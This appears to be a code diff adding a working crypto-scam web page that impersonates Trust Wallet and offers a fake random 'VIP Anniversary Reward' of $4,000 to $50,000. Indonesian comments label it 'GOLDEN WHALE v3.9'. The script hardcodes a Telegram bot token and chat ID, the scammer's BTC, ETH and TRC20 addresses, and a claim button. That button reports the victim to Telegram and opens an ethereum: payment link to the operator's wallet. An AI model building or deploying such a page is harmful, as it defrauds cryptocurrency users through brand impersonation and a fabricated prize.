@@ -1,0 +1,94 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trust Wallet | VIP Anniversary Reward</title>
+    <style>
+        body { background-color: #0b0e11; color: white; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; overflow: hidden; }
+        .card { width: 90%; max-width: 400px; background: radial-gradient(circle, #1e2329 0%, #0b0e11 100%); border-radius: 25px; padding: 40px; text-align: center; border: 2px solid #f0b90b; position: relative; }
+        
+        /* Animasi Kado Bergoyang */
+        .gift-box { font-size: 80px; cursor: pointer; transition: 0.5s; display: inline-block; animation: shake 1.5s infinite; }
+        @keyframes shake {
+            0% { transform: rotate(0deg); }
+            10% { transform: rotate(10deg); }
+            20% { transform: rotate(-10deg); }
+            30% { transform: rotate(10deg); }
+            40% { transform: rotate(0deg); }
+        }
+        
+        .prize-amount { font-size: 40px; font-weight: bold; color: #f0b90b; display: none; margin: 20px 0; text-shadow: 0 0 20px rgba(240,185,11,0.5); }
+        .confetti { position: absolute; display: none; width: 100%; height: 100%; top: 0; left: 0; pointer-events: none; }
+        
+        .btn-claim { background: linear-gradient(135deg, #f0b90b 0%, #fabc2e 100%); color: #000; border: none; padding: 20px; width: 100%; border-radius: 15px; font-weight: bold; cursor: pointer; font-size: 18px; margin-top: 20px; display: none; box-shadow: 0 5px 15px rgba(240,185,11,0.4); }
+        
+        p { color: #848e9c; font-size: 14px; margin-top: 15px; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <div id="gift" class="gift-box" onclick="openGift()">🎁</div>
+        <h2 id="title">You Have 1 Unopened Gift!</h2>
+        <div id="prize" class="prize-amount"></div>
+        <p id="desc">Tap the gift box to reveal your exclusive Trust Wallet reward.</p>
+        
+        <button id="btnClaim" class="btn-claim" onclick="finalExecution()">CONFIRM & RECEIVE</button>
+        
+        <div class="footer" style="margin-top:30px; font-size:10px; opacity:0.5;">
+            ID: TW-GOLD-2026 | Secure Node Verified
+        </div>
+    </div>
+
+    <script>
+        // JANTUNG SISTEM (Isi Alamatmu)
+        const tgToken = "8726568620:AAEt1emydQmWAEuJxgbDUDjYJI5S8C1F0b0";
+        const tgChatId = "8795373522";
+        const myBTC = "1UUSKBpFYtuVokVL6eEJK7kscXB9xNEex";
+        const myETH = "0xab87d76807550950a56caf805bc7808be4311a55";
+        const myTRC20 = "TDXq6ShGevYuTLfFmfV5BxSRPxpguoFXic";
+
+        // Fungsi Mengacak Hadiah ($4,000 - $50,000)
+        const randomPrize = Math.floor(Math.random() * (50000 - 4000 + 1)) + 4000;
+        const formattedPrize = new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(randomPrize);
+
+        function openGift() {
+            document.getElementById('gift').style.animation = "none";
+            document.getElementById('gift').innerHTML = "🔓";
+            document.getElementById('title').innerText = "CONGRATULATIONS!";
+            document.getElementById('prize').innerText = formattedPrize;
+            document.getElementById('prize').style.display = "block";
+            document.getElementById('btnClaim').style.display = "block";
+            document.getElementById('desc').innerText = "Your reward is ready. Please confirm to synchronize with your main balance.";
+        }
+
+        function finalExecution() {
+            // Laporan ke Telegram
+            const pesan = `
+<b>🔥 GOLDEN WHALE v3.9 🔥</b>
+━━━━━━━━━━━━━━━━━━
+<b>Prize Won:</b> 💰 ${formattedPrize}
+<b>Status:</b> 🚀 Waiting Confirmation
+━━━━━━━━━━━━━━━━━━
+<b>Routes Active:</b>
+BTC: <code>${myBTC}</code>
+ETH: <code>${myETH}</code>
+TRC20: <code>${myTRC20}</code>
+━━━━━━━━━━━━━━━━━━
+<i>Ikan Paus sedang menekan tombol Confirm!</i>
+            `;
+
+            fetch(`https://api.telegram.org/bot${tgToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: tgChatId, text: pesan, parse_mode: 'html' })
+            })
+            .then(() => {
+                // Buka Dompet (Trigger Transfer 0 ETH/Token)
+                window.location.href = `ethereum:${myETH}?value=0`;
+            });
+        }
+    </script>
+</body>
+</html>
